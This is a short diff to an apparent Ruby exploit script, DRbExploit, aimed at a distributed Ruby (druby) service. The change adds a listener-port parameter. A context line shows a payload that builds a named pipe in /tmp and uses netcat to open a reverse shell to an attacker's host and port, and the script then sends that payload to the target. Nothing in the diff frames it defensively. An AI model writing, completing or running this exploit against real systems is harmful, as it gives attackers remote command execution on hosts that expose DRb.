@@ -2,7 +2,7 @@ require 'drb/drb'
 require 'ostruct'
 
 class DRbExploit
-  def initialize(host, port)
+  def initialize(host, port, lport)
     @uri = "druby://#{host}:#{port}"
   end
 
@@ -72,5 +72,5 @@ payload = OpenStruct.new(encoded: "mkfifo /tmp/gythfa; nc #{lhost} #{lport} 0</t
 
 
 # Create exploit object with provided host and port
-exploit = DRbExploit.new(host, port)
+exploit = DRbExploit.new(host, port, lport)
 exploit.exploit(payload)
